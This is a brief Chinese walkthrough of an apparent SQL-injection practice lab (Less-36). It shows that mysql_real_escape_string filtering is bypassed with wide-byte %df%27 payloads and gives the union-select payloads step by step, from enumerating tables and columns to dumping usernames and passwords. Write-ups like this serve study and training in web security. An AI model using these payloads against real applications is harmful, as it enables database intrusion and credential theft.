# Less-36

查看后端代码发现使用了mysql_real_escape_string函数对输入的字符进行过滤：

~~~ php
    $string= mysql_real_escape_string($string);    
~~~

可以尝试宽字节注入



~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-36-01](.\img\Less-36-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),version()--+
~~~

![Less-36-02](.\img\Less-36-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name) from information_schema.tables where table_schema = database()--+
~~~

![Less-36-03](.\img\Less-36-03.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%20=0x7573657273--+
~~~

![Less-36-04](.\img\Less-36-04.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-36-05](.\img\Less-36-05.png)

